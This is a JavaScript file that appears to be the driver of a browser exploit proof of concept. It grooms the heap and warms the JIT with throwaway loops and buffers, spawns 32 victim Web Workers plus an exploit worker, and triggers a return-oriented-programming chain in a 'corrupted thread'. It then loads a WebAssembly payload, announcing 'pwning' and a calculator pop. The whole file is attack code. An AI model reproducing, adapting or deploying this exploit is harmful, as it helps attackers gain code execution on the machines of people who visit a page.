function print(s) {
    document.getElementById("log").innerHTML += s+"<br>"
}

// try to spawn aux jit/gc threads
function opt(k) {
    for (let i = 0; i < 10000; i++);
    let a = new Array(256)
    for (let i = 0; i < 256; i++)
        a[i] = i
    let j = 0
    for (let i = 0; i < 256; i++) {
        j = (j+a[i]+k.charCodeAt(i%k.length))&0xff
        let tmp = a[i]
        a[i] = a[j]
        a[j] = a[i]
    }
    return a
}
let kk = new Array(100000)
for (let i = 0; i < kk.length; i++)
    kk[i] = opt(String.fromCharCode(0x41+(i%26)).repeat(32))
kk = null
for (let i = 0; i < 20; i++)
    new ArrayBuffer(1<<20)

function go() {
    let vics = new Array(32)
    let nvics = 0
    for (let i = 0; i < vics.length; i++) {
        vics[i] = new Worker("worker2.js")
        vics[i].onmessage = function(evt) {
            nvics++
            if (nvics === vics.length) {
                let worker = new Worker("worker.js")
                worker.onmessage = function(evt) {
                    if (typeof(evt.data) === "string")
                        print(evt.data)
                    else if (evt.data === true) {
                        // trigger rop in corrupted thread
                        for (let i = 0; i < vics.length; i++)
                            vics[i].postMessage(true)
                    }
                    else if (evt.data === false) {
                        print("pwning... please wait...")
                        fetch("rets.wasm").then(r => r.arrayBuffer()).then(function(rawmod) {
                            let mod = new WebAssembly.Module(rawmod)
                            print("calc pop imminent...")
                            worker.postMessage(mod)
                        })
                    }
                }
            }
        }
    }
}
setTimeout(go, 2000)
